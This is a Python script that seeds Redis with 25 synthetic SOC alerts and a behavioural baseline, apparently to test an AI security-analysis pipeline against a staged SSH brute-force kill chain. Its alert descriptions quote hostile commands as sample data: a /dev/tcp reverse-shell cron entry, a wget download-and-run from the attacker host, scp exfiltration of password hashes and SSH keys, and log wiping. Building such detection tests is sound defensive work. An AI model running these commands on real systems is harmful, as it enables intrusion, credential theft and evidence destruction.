"""
Perfect Brute-Force Campaign Simulation
========================================
Bypasses file I/O and directly seeds Redis with 25 hand-crafted NormalizedAlert
objects that span the full attack kill chain:

  Phase 1: Reconnaissance      T1046  (Network Service Discovery)
  Phase 2: Brute Force         T1110.001 + T1110.003
  Phase 3: Initial Access      T1078  (Valid Accounts - compromise confirmed)
  Phase 4: Privilege Escalation T1548.003 + T1033
  Phase 5: Persistence         T1098.004 + T1053.005
  Phase 6: Lateral Movement    T1021.004
  Phase 7: Exfiltration        T1003.008 + T1074.001 + T1048
  Phase 8: Defense Evasion     T1070.002 + T1070.003

IMPORTANT: iheb.mabrouki is the FIRST user-associated alert so the UEBA report
targets the correct account and feeds the correlator node with anomaly indicators.

Usage (run inside soc-ai container):
  docker exec soc-ai python3 /app/app/simulate_perfect_bruteforce.py
"""

import asyncio
import json
import uuid
import redis.asyncio as aioredis
from datetime import datetime, timezone, timedelta

# -- Config -------------------------------------------------------------------
REDIS_URL       = "redis://soc-ai-redis:6379"
CAMPAIGN_KEY    = "alerts:cmp-192.168.10.128"
ATTACKER_IP     = "192.168.10.50"
VICTIM_IP       = "192.168.10.101"
VICTIM_HOST     = "victim-linux"
TARGET_USER     = "iheb.mabrouki"

# -- Helpers ------------------------------------------------------------------
def ts(offset_seconds: int = 0) -> str:
    t = datetime.now(timezone.utc) + timedelta(seconds=offset_seconds)
    return t.isoformat()

def alert(
    name: str,
    description: str,
    severity: str,
    mitre_id: str,
    mitre_phase: int,
    offset: int,
    src_ip: str = ATTACKER_IP,
    dst_ip: str = VICTIM_IP,
    src_port=None,
    dst_port=22,
    hostname: str = VICTIM_HOST,
    user=None,
    process_name=None,
    file_path=None,
    source_system: str = "wazuh",
) -> dict:
    return {
        "alert_id":             str(uuid.uuid4()),
        "original_alert_id":    None,
        "timestamp":            ts(offset),
        "source_system":        source_system,
        "name":                 name,
        "description":          description,
        "severity":             severity,
        "src_ip":               src_ip,
        "dst_ip":               dst_ip,
        "src_port":             src_port,
        "dst_port":             dst_port,
        "hostname":             hostname,
        "user":                 user,
        "file_path":            file_path,
        "process_name":         process_name,
        "file_hash":            None,
        "mitre_technique_id":   mitre_id,
        "mitre_technique_name": None,
        "mitre_phase":          mitre_phase,
        "campaign_id":          "cmp-192.168.10.128",
        "ueba_score":           None,
        "embedding":            [],
        "raw_data": {
            "rule": {
                "id": "sim",
                "level": {"low": 5, "medium": 7, "high": 10, "critical": 14}[severity],
                "description": name,
                "mitre": {"id": [mitre_id]},
            },
            "agent": {"name": VICTIM_HOST, "ip": VICTIM_IP},
            "data": {"srcip": src_ip, "srcuser": user},
        },
    }


def build_alerts() -> list:
    """
    25-alert perfect kill-chain.
    ORDER IS CRITICAL: iheb.mabrouki must be first user-associated alert (index 2)
    so the UEBA correlator node generates an anomaly report for the right account.
    """
    return [
        # -- [01] Recon: Nmap port scan (no user yet) --------------------------
        alert(
            name="Nmap SSH Port Scan Detected - Pre-Attack Reconnaissance",
            description=(
                f"Inbound SYN port scan from external IP {ATTACKER_IP} targeting {VICTIM_HOST} "
                f"({VICTIM_IP}). Nmap scan fingerprint: 127 ports probed in 12 seconds. "
                "Port 22/tcp confirmed OPEN (OpenSSH 8.2p1 Ubuntu). Port scan consistent "
                "with automated pre-attack reconnaissance. MITRE T1046 - Network Service Discovery."
            ),
            severity="medium", mitre_id="T1046", mitre_phase=1, offset=-600,
        ),

        # -- [02] Recon: SSH banner grab (no user yet) -------------------------
        alert(
            name="SSH Banner Enumeration - OpenSSH Version Fingerprinting",
            description=(
                f"SSH version enumeration from {ATTACKER_IP}: target {VICTIM_HOST} "
                "responded with 'SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5'. "
                "Attacker confirmed target OS: Ubuntu 20.04 LTS. "
                "This fingerprint is used to select version-specific wordlists and exploits. "
                "MITRE T1046 - Network Service Discovery."
            ),
            severity="low", mitre_id="T1046", mitre_phase=1, offset=-590,
        ),

        # -- [03] Credential Access: FIRST iheb.mabrouki alert -> UEBA target --
        alert(
            name="SSH Brute-Force Initiated - iheb.mabrouki Targeted by Hydra",
            description=(
                f"Automated SSH brute-force STARTED by {ATTACKER_IP} against account "
                f"'{TARGET_USER}' on {VICTIM_HOST} ({VICTIM_IP}). "
                "Tool fingerprint: Hydra v9.4 (burst rate 5 attempts/30s with 6-second jitter). "
                "Wordlist: rockyou-top10000.txt. Attempts 1-5: "
                "[qwerty123, iheb2024, Mabrouki1, Pass@2024, Welcome1]. "
                f"Source IP {ATTACKER_IP} has NEVER authenticated to this account before. "
                "MITRE T1110.001 - Brute Force: Password Guessing."
            ),
            severity="high", mitre_id="T1110.001", mitre_phase=2,
            offset=-550, user=TARGET_USER,
        ),

        # -- [04] Password Spray: multiple accounts ----------------------------
        alert(
            name="SSH Password Spray - Multiple Accounts (root/admin/ubuntu)",
            description=(
                f"{ATTACKER_IP} sprayed password 'Summer2024!' across 8 accounts on {VICTIM_HOST}: "
                "[root, admin, ubuntu, pi, oracle, postgres, deploy, iheb.mabrouki]. "
                "Low velocity per account avoids lockout triggers. "
                "All 8 attempts failed. MITRE T1110.003 - Brute Force: Password Spraying."
            ),
            severity="high", mitre_id="T1110.003", mitre_phase=2,
            offset=-530, user="root",
        ),

        # -- [05] Focused brute-force batch 2 (iheb.mabrouki) -----------------
        alert(
            name="SSH Authentication Failed - iheb.mabrouki (Attempts 6-10)",
            description=(
                f"5 consecutive failed logins for '{TARGET_USER}' from {ATTACKER_IP}. "
                "Passwords tried: [Iheb@123, linux2024, Securit@, AttijarI1, Tunisi@2024]. "
                "Rate: 1 attempt per 6 seconds - below threshold rate, evading most SIEM rules. "
                "Total failures from this IP on this account: 10."
            ),
            severity="low", mitre_id="T1110.001", mitre_phase=2,
            offset=-510, user=TARGET_USER,
        ),

        # -- [06] Focused brute-force batch 3 ---------------------------------
        alert(
            name="SSH Authentication Failed - iheb.mabrouki (Attempts 11-15)",
            description=(
                f"5 consecutive failed logins for '{TARGET_USER}' from {ATTACKER_IP}. "
                "Passwords tried: [P@ssword1!, Attijari2024, SOC@dmin1, Mabrouk1!, TN@2024pass]. "
                "Total failures: 15. Attack duration: 4.5 minutes. Automated tooling confirmed."
            ),
            severity="low", mitre_id="T1110.001", mitre_phase=2,
            offset=-490, user=TARGET_USER,
        ),

        # -- [07] Focused brute-force batch 4 ---------------------------------
        alert(
            name="SSH Authentication Failed - iheb.mabrouki (Attempts 16-20)",
            description=(
                f"5 consecutive failed logins for '{TARGET_USER}' from {ATTACKER_IP}. "
                "Passwords tried: [CyberSOC2024, Iheb.Mabrouki1, ATB@2024!, BFI@dmin, TunisiaBank1]. "
                "Total failures: 20. Attacker is persisting with an expanded wordlist."
            ),
            severity="low", mitre_id="T1110.001", mitre_phase=2,
            offset=-470, user=TARGET_USER,
        ),

        # -- [08] Focused brute-force batch 5 ---------------------------------
        alert(
            name="SSH Authentication Failed - iheb.mabrouki (Attempts 21-25)",
            description=(
                f"5 consecutive failed logins for '{TARGET_USER}' from {ATTACKER_IP}. "
                "Passwords tried: [SOC2024#, Mabrouki@2, Admin2024!, guest@1234, user@SOC]. "
                "Total failures: 25. Threshold for Wazuh rule 100003 (CRITICAL) reached."
            ),
            severity="low", mitre_id="T1110.001", mitre_phase=2,
            offset=-450, user=TARGET_USER,
        ),

        # -- [09] Suricata: Hydra fingerprint (network layer) -----------------
        alert(
            name="ET SCAN: SSH Brute-Force Tool Detected (Hydra/Medusa Fingerprint)",
            description=(
                f"Suricata IDS signature match: ET SCAN Potential SSH Scan (HYDRA). "
                f"Source: {ATTACKER_IP} -> Destination: {VICTIM_IP}:22. "
                "SID: 2001219. Traffic pattern: 5 SYN packets per burst, 250ms jitter, "
                "no failed banner exchange. Confidence: HIGH. "
                "Corroborates Wazuh SSH failure events. MITRE T1110.001."
            ),
            severity="high", mitre_id="T1110.001", mitre_phase=2,
            offset=-440, source_system="suricata",
        ),

        # -- [10] Wazuh composite HIGH ----------------------------------------
        alert(
            name="Wazuh Rule 100002: SSH Brute Force Detected - HIGH (>=5 failures/120s)",
            description=(
                f"Wazuh frequency rule fired: {ATTACKER_IP} produced >=5 SSH failures "
                f"on {VICTIM_HOST} within 120 seconds. "
                f"Targeted user: {TARGET_USER} | Total failures: 25 | Duration: 8.3 minutes. "
                "Rule groups: authentication_failure, brute_force. "
                "MITRE T1110.001 - Brute Force: Password Guessing. Phase: Credential Access."
            ),
            severity="high", mitre_id="T1110.001", mitre_phase=2,
            offset=-430, user=TARGET_USER,
        ),

        # -- [11] Wazuh composite CRITICAL ------------------------------------
        alert(
            name="Wazuh Rule 100003: SSH Brute Force CRITICAL - 25 Failures (Hydra Confirmed)",
            description=(
                f"CRITICAL: Sustained SSH brute force from {ATTACKER_IP} - 25 authentication "
                f"failures in under 9 minutes against {VICTIM_HOST}. "
                "Correlated with Suricata Hydra fingerprint (SID 2001219). "
                "Tool: Hydra v9.4. Wordlist: rockyou-top10000. Immediate response required. "
                f"Targeted account: {TARGET_USER}. "
                "MITRE T1110.001 | T1110.003 | T1078 (pending success confirmation)."
            ),
            severity="critical", mitre_id="T1110.001", mitre_phase=2,
            offset=-420, user=TARGET_USER,
        ),

        # -- [12] COMPROMISE: Successful SSH login T1078 ----------------------
        alert(
            name="SSH LOGIN SUCCESS - iheb.mabrouki FROM ATTACKER IP (ACCOUNT COMPROMISED)",
            description=(
                f"CRITICAL: Successful SSH authentication for account '{TARGET_USER}' "
                f"from {ATTACKER_IP} on {VICTIM_HOST} ({VICTIM_IP}). "
                "Session opened. Interactive PTY allocated (bash). "
                f"Source IP {ATTACKER_IP} has NEVER previously authenticated for this account. "
                "UEBA baseline: iheb.mabrouki normally authenticates from 10.0.1.72 / 10.0.1.73. "
                "Anomaly: new external IP after 25+ failed attempts = brute-force SUCCESS. "
                "MITRE T1078 - Valid Accounts: Initial Access via Compromised Credentials."
            ),
            severity="critical", mitre_id="T1078", mitre_phase=3,
            offset=-400, user=TARGET_USER,
        ),

        # -- [13] Post-login: Discovery commands ------------------------------
        alert(
            name="Post-Compromise Enumeration - System Discovery Commands Executed",
            description=(
                f"Immediately after SSH login, '{TARGET_USER}' (src: {ATTACKER_IP}) ran: "
                "'id' -> uid=1001(iheb.mabrouki) gid=1001 groups=1001,27(sudo); "
                "'whoami' -> iheb.mabrouki; "
                "'uname -a' -> Linux victim-linux 5.4.0-182-generic x86_64; "
                "'cat /etc/os-release' -> Ubuntu 20.04.6 LTS; "
                "'ip a' -> confirmed internal network range 192.168.10.0/24. "
                "Automated enumeration script pattern. "
                "MITRE T1033 (System Owner Discovery), T1082 (System Information Discovery)."
            ),
            severity="high", mitre_id="T1033", mitre_phase=3,
            offset=-395, user=TARGET_USER, process_name="bash",
        ),

        # -- [14] Privilege Escalation: sudo ----------------------------------
        alert(
            name="Sudo Privilege Escalation - iheb.mabrouki Obtained Root Shell",
            description=(
                f"User '{TARGET_USER}' (from {ATTACKER_IP}) escalated to root: "
                "'sudo -l' -> ALL privileges (NOPASSWD). "
                "'sudo cat /etc/shadow' -> /etc/shadow read (42 password hashes captured). "
                "'sudo bash' -> root interactive shell obtained. "
                "FULL SYSTEM COMPROMISE. "
                "MITRE T1548.003 - Abuse Elevation Control: Sudo and Sudo Caching."
            ),
            severity="critical", mitre_id="T1548.003", mitre_phase=4,
            offset=-390, user=TARGET_USER, process_name="sudo",
        ),

        # -- [15] Persistence: SSH backdoor key -------------------------------
        alert(
            name="SSH Backdoor Key Planted - Unauthorized authorized_keys Entry",
            description=(
                f"Root process added SSH public key to /home/{TARGET_USER}/.ssh/authorized_keys. "
                "Key: 'ssh-rsa AAAA...attacker_backdoor_2024 root@attacker-host'. "
                "Fingerprint: SHA256:k3y4B4ckd00r/AttackerPersistence2024. "
                "This allows attacker to re-authenticate WITHOUT a password in perpetuity. "
                "MITRE T1098.004 - Account Manipulation: SSH Authorized Keys."
            ),
            severity="critical", mitre_id="T1098.004", mitre_phase=4,
            offset=-380, user=TARGET_USER, process_name="bash",
            file_path=f"/home/{TARGET_USER}/.ssh/authorized_keys",
        ),

        # -- [16] Persistence: Cron reverse shell -----------------------------
        alert(
            name="Malicious Cron Job Installed - Reverse Shell Every 5 Minutes",
            description=(
                f"Root-owned cron entry created in /etc/cron.d/sysupdate: "
                f"'*/5 * * * * root bash -i >& /dev/tcp/{ATTACKER_IP}/4444 0>&1'. "
                f"Effect: reverse shell to {ATTACKER_IP}:4444 every 5 minutes. "
                "This ensures persistence survives reboots and SSH session termination. "
                "MITRE T1053.005 - Scheduled Task/Job: Cron. T1059.004 - Unix Shell."
            ),
            severity="critical", mitre_id="T1053.005", mitre_phase=4,
            offset=-370, user="root", process_name="cron",
            file_path="/etc/cron.d/sysupdate",
        ),

        # -- [17] Lateral movement: SSH to 192.168.10.102 --------------------
        alert(
            name="Lateral Movement via SSH - victim-linux pivot to 192.168.10.102",
            description=(
                f"Attacker (controlling {VICTIM_HOST} as root) pivoted to 192.168.10.102: "
                f"'ssh -i /home/{TARGET_USER}/.ssh/id_rsa {TARGET_USER}@192.168.10.102'. "
                "Connection accepted (private key found during enumeration). "
                "New foothold on 192.168.10.102 established. "
                "Network lateral movement: 192.168.10.101 -> 192.168.10.102. "
                "MITRE T1021.004 - Remote Services: SSH."
            ),
            severity="critical", mitre_id="T1021.004", mitre_phase=5,
            offset=-360, user=TARGET_USER, process_name="ssh",
            src_ip=VICTIM_IP, dst_ip="192.168.10.102",
        ),

        # -- [18] Credential dumping: /etc/shadow -----------------------------
        alert(
            name="Credential Dump - /etc/shadow and SSH Private Keys Accessed",
            description=(
                "Root process accessed credential materials: "
                "'cat /etc/passwd' -> 42 user accounts enumerated. "
                "'cat /etc/shadow' -> 42 SHA-512 hashed passwords captured. "
                "'cat /etc/sudoers' -> sudoers privileges mapped. "
                "'find / -name id_rsa 2>/dev/null' -> 3 SSH private keys found: "
                "/home/iheb.mabrouki/.ssh/id_rsa, /home/deploy/.ssh/id_rsa, /root/.ssh/id_rsa. "
                "MITRE T1003.008 - OS Credential Dumping: /etc/passwd and /etc/shadow."
            ),
            severity="critical", mitre_id="T1003.008", mitre_phase=6,
            offset=-350, user="root", process_name="cat",
            file_path="/etc/shadow",
        ),

        # -- [19] Data staging ------------------------------------------------
        alert(
            name="Exfiltration Staging - Sensitive Data Archived to /tmp/loot.tar.gz",
            description=(
                "Root process created data exfiltration archive: "
                "'tar czf /tmp/loot.tar.gz /etc/passwd /etc/shadow /home/*/.ssh /var/log/auth.log'. "
                "Archive size: 2.4 MB. Contents: 42 password hashes, 3 SSH private keys, "
                "30 days of authentication logs. "
                "File created at /tmp/loot.tar.gz. "
                "MITRE T1074.001 - Data Staged: Local Data Staging."
            ),
            severity="critical", mitre_id="T1074.001", mitre_phase=6,
            offset=-340, user="root", process_name="tar",
            file_path="/tmp/loot.tar.gz",
        ),

        # -- [20] Exfiltration via SCP ----------------------------------------
        alert(
            name="Data Exfiltration via SCP - 2.4 MB Credentials Transferred to Attacker",
            description=(
                f"Outbound exfiltration detected: "
                f"'scp /tmp/loot.tar.gz {TARGET_USER}@{ATTACKER_IP}:/home/attacker/loot/'. "
                f"Transfer: {VICTIM_IP}:51234 -> {ATTACKER_IP}:22. "
                "Size: 2.4 MB. Duration: 8 seconds. "
                "Contents: 42 SHA-512 password hashes, 3 SSH private keys, auth logs. "
                "MITRE T1048 - Exfiltration over Alternative Protocol (SCP over SSH). "
                "T1002 - Data Compressed."
            ),
            severity="critical", mitre_id="T1048", mitre_phase=7,
            offset=-330, user=TARGET_USER, process_name="scp",
            src_ip=VICTIM_IP, dst_ip=ATTACKER_IP,
        ),

        # -- [21] Suricata: Exfil corroboration -------------------------------
        alert(
            name="ET POLICY: Large SSH Upload Detected - Data Exfiltration Corroborated",
            description=(
                f"Suricata: Outbound SSH session {VICTIM_IP}:51234 -> {ATTACKER_IP}:22. "
                "Payload anomaly: 2.4 MB uploaded in 8 seconds (abnormal for interactive SSH). "
                "Rule: ET POLICY SSH Session upload threshold exceeded. SID: 2001711. "
                "Cross-corroborates SCP exfiltration event from Wazuh. "
                "MITRE T1048 - Exfiltration over Alternative Protocol."
            ),
            severity="high", mitre_id="T1048", mitre_phase=7,
            offset=-328, source_system="suricata",
            src_ip=VICTIM_IP, dst_ip=ATTACKER_IP,
        ),

        # -- [22] Defense Evasion: log clearing -------------------------------
        alert(
            name="Log Tampering - auth.log Zeroed, Bash History Cleared",
            description=(
                "Attacker (root) cleared forensic traces: "
                "'echo > /var/log/auth.log' -> auth.log zeroed (was 1.2 MB). "
                "'history -c && export HISTFILESIZE=0' -> bash history erased for all users. "
                "'truncate -s 0 /var/log/syslog' -> syslog cleared. "
                "'rm -f /tmp/loot.tar.gz' -> staging file removed. "
                "MITRE T1070.002 - Indicator Removal: Clear Linux or Mac System Logs. "
                "T1070.003 - Clear Command History."
            ),
            severity="critical", mitre_id="T1070.002", mitre_phase=7,
            offset=-320, user="root", process_name="bash",
            file_path="/var/log/auth.log",
        ),

        # -- [23] C2: Active reverse shell ------------------------------------
        alert(
            name="Active C2 Connection - Reverse Shell to Attacker Port 4444",
            description=(
                f"Active reverse shell detected: {VICTIM_HOST} -> {ATTACKER_IP}:4444 (TCP ESTABLISHED). "
                "Process: bash (PID 31337) with stdin/stdout/stderr redirected to TCP socket. "
                "Session age: 32 minutes. "
                f"Triggered by cron job /etc/cron.d/sysupdate (every 5 min). "
                f"Attacker at {ATTACKER_IP} has sustained interactive root access to {VICTIM_HOST}. "
                "MITRE T1071.004 - C2 via Application Layer Protocol. "
                "T1059.004 - Unix Shell. T1571 - Non-Standard Port."
            ),
            severity="critical", mitre_id="T1071.004", mitre_phase=7,
            offset=-310, user="root", process_name="bash",
            src_ip=VICTIM_IP, dst_ip=ATTACKER_IP,
        ),

        # -- [24] Impact: additional tool downloaded --------------------------
        alert(
            name="Suspicious Binary Downloaded from C2 - Post-Exploitation Tool",
            description=(
                f"Root process executed: 'wget http://{ATTACKER_IP}:8080/tools/scanner -O /tmp/scanner'. "
                "File downloaded: /tmp/scanner (ELF64, 847 KB). "
                "MD5: 5f4dcc3b5aa765d61d8327deb882cf99 (matches known post-exploitation framework). "
                "File made executable (chmod +x) and launched. "
                "MITRE T1105 - Ingress Tool Transfer. T1046 - Network Service Discovery (phase 2)."
            ),
            severity="critical", mitre_id="T1105", mitre_phase=7,
            offset=-300, user="root", process_name="wget",
            file_path="/tmp/scanner",
        ),

        # -- [25] Internal recon: scanner sweeping internal network -----------
        alert(
            name="Internal Network Scan - Compromised Host Scanning 192.168.10.0/24",
            description=(
                f"Post-compromise internal scan from {VICTIM_HOST} ({VICTIM_IP}): "
                "/tmp/scanner probing 192.168.10.0/24 (254 hosts) on ports 22,3306,5432,6379,8080. "
                "Hosts found: 192.168.10.100, 192.168.10.101, 192.168.10.102, 192.168.10.200. "
                "Services identified: SSH (x3), MySQL (x1), Redis (x1). "
                "Attacker is mapping the internal network for further lateral movement. "
                "Blast radius expands to entire 192.168.10.0/24 subnet. "
                "Destination IPs: 192.168.10.100, 192.168.10.102, 192.168.10.200. "
                "Hosts: victim-linux, 192.168.10.102, db-server-01. "
                "MITRE T1046 - Network Service Discovery. Kill chain: Lateral Movement preparation."
            ),
            severity="critical", mitre_id="T1046", mitre_phase=5,
            offset=-290, user="root", process_name="scanner",
            src_ip=VICTIM_IP, dst_ip="192.168.10.0",
        ),
    ]


# -- UEBA Baseline Seed -------------------------------------------------------
async def seed_ueba_baseline(r: aioredis.Redis):
    """
    Seeds a realistic 3-month UEBA baseline for iheb.mabrouki so the AI
    sees a clear deviation when the attacker IP 192.168.10.50 appears.
    """
    print("Seeding UEBA baseline for iheb.mabrouki...")
    username = TARGET_USER
    p = r.pipeline()

    # Normal source IPs (work laptops - NOT the attacker IP 192.168.10.50)
    for ip in ["10.0.1.72", "10.0.1.73"]:
        p.sadd(f"ueba:user:{username}:ips", ip)

    # Normal destination hosts
    for host in ["siem-console", "log-server-01", "backup-srv", "mgmt-01"]:
        p.sadd(f"ueba:user:{username}:hosts", host)

    # Normal destination IPs (internal SOC infrastructure)
    for ip in ["10.0.1.10", "10.0.1.20", "10.0.1.50", "10.0.1.60"]:
        p.sadd(f"ueba:user:{username}:dst_ips", ip)

    # Active hours: Mon-Fri 08:00-18:00 (counts represent 90-day history)
    hour_counts = {
        "8": 42, "9": 118, "10": 132, "11": 125, "12": 78,
        "13": 38, "14": 107, "15": 122, "16": 115, "17": 93, "18": 28
    }
    for hour, count in hour_counts.items():
        p.hset(f"ueba:user:{username}:hours", hour, count)

    # Known normal processes
    for proc in ["bash", "python3", "ssh", "scp", "vim", "ansible", "git"]:
        p.sadd(f"ueba:user:{username}:processes", proc)

    await p.execute()
    print(f"  Baseline: known IPs=[10.0.1.72, 10.0.1.73], hours=08-18")
    print(f"  Attacker IP {ATTACKER_IP} is NOT in baseline -> ANOMALY WILL FIRE")
    print(f"  {VICTIM_HOST} is NOT a known host -> ANOMALY WILL FIRE")


# -- Main ---------------------------------------------------------------------
async def main():
    r = aioredis.from_url(REDIS_URL, encoding="utf-8", decode_responses=True)

    print(f"\n{'='*70}")
    print("  PERFECT BRUTE-FORCE CAMPAIGN SIMULATION")
    print(f"  Attacker:  {ATTACKER_IP}  (Hydra v9.4 SSH brute-force)")
    print(f"  Target:    {VICTIM_HOST} ({VICTIM_IP})")
    print(f"  Account:   {TARGET_USER}")
    print(f"  Campaign:  cmp-192.168.10.128 (class C subnet attack)")
    print(f"{'='*70}\n")

    # 1. Seed UEBA baseline
    await seed_ueba_baseline(r)

    # 2. Clear existing buffer
    old_count = await r.llen(CAMPAIGN_KEY)
    await r.delete(CAMPAIGN_KEY)
    print(f"\nCleared {old_count} old alerts from '{CAMPAIGN_KEY}'")

    # 3. Build and push 25 kill-chain alerts
    alerts = build_alerts()
    print(f"Pushing {len(alerts)} alerts to Redis...\n")

    phase_labels = {
        1: "Reconnaissance",
        2: "Credential Access",
        3: "Initial Access",
        4: "Privilege Esc/Persistence",
        5: "Lateral Movement",
        6: "Collection",
        7: "Exfiltration/C2",
    }

    p = r.pipeline()
    for i, a in enumerate(alerts):
        phase = phase_labels.get(a["mitre_phase"], "Unknown")
        sev = a["severity"].upper()
        mid = a["mitre_technique_id"]
        name_short = a["name"][:55]
        user_str = f"[user={a['user']}]" if a["user"] else ""
        print(f"  [{i+1:02d}] [{sev:8}] [{mid:12}] [Phase {a['mitre_phase']}: {phase[:22]}] {user_str}")
        print(f"       {name_short}")
        p.rpush(CAMPAIGN_KEY, json.dumps(a))

    await p.execute()
    await r.expire(CAMPAIGN_KEY, 7200)

    # 4. Verify
    count = await r.llen(CAMPAIGN_KEY)
    print(f"\n{'='*70}")
    print(f"Buffer '{CAMPAIGN_KEY}': {count} alerts ready for AI analysis.")
    print(f"\nKill chain coverage (25 alerts, 8 phases):")
    print(f"  Phase 1  Reconnaissance         T1046    (Nmap + SSH banner)")
    print(f"  Phase 2  Credential Access       T1110.001/T1110.003 (10 alerts + Suricata)")
    print(f"  Phase 3  Initial Access          T1078    (SSH login SUCCESS)")
    print(f"  Phase 3  Discovery               T1033    (id/whoami/uname)")
    print(f"  Phase 4  Privilege Escalation    T1548.003 (sudo -> root)")
    print(f"  Phase 4  Persistence             T1098.004 (SSH backdoor key)")
    print(f"  Phase 4  Persistence             T1053.005 (cron reverse shell)")
    print(f"  Phase 5  Lateral Movement        T1021.004 (SSH pivot -> .102)")
    print(f"  Phase 5  Discovery (post-pivot)  T1046    (internal network scan)")
    print(f"  Phase 6  Collection              T1003.008 (shadow/passwd/keys)")
    print(f"  Phase 6  Staging                 T1074.001 (loot.tar.gz)")
    print(f"  Phase 7  Exfiltration            T1048    (SCP + Suricata)")
    print(f"  Phase 7  C2                      T1071.004 (reverse shell :4444)")
    print(f"  Phase 7  Tool Transfer           T1105    (scanner binary)")
    print(f"  Phase 7  Defense Evasion         T1070.002 (log clearing)")
    print(f"\nUEBA anomalies that will fire:")
    print(f"  - New source IP: {ATTACKER_IP} (not in iheb.mabrouki baseline)")
    print(f"  - New destination host: {VICTIM_HOST} (not in iheb.mabrouki baseline)")
    print(f"  - Off-hours login (attack happening now, outside 08-18 baseline)")
    print(f"\nAI analysis picks this up on the next analyzer tick (~30s).")
    print(f"Expected time: ~20-40 seconds (GPU-accelerated Mistral 7B on Ollama).")
    print(f"Dashboard: http://localhost:3000")
    print(f"{'='*70}\n")

    await r.aclose()


if __name__ == "__main__":
    asyncio.run(main())
